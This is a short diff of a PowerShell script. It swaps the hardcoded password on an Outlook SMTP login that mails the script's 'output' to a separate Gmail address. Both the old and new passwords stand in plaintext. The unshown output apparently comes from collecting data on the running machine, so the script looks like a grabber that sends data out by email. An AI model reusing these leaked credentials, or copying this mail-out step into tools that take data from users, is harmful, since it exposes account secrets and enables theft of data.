@@ -17,7 +17,7 @@ $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
 $Message = new-object Net.Mail.MailMessage
 $smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
-$smtp.Credentials = New-Object System.Net.NetworkCredential("shibadigi08_0@outlook.com", "shibainu2020");
+$smtp.Credentials = New-Object System.Net.NetworkCredential("shibadigi08_0@outlook.com", "(949847689)");
 $smtp.EnableSsl = $true
 $Message.From = "shibadigi08_0@outlook.com"
 $Message.To.Add("fernandimcarlims@gmail.com")
